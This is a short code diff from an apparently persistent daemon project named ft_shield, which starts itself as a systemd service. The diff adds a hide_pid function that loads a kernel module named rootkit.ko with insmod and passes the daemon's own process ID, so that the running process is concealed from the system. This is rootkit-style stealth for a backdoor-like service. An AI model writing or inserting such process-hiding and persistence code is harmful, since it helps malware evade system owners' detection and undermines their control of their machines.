@@ -62,6 +62,14 @@ void startup_setup (void) {
 	system("systemctl start ft_shield.service");
 }
 
+void hide_pid(void) {
+	int pid = getpid();
+	char cmd[256];
+
+	snprintf(cmd, sizeof(cmd), "insmod %s hidden_pid=%d", "./srcs/modules/rootkit.ko", pid);
+	system(cmd);
+}
+
 void ft_daemonize(void) {
 	pid_t pid = fork(); 
 
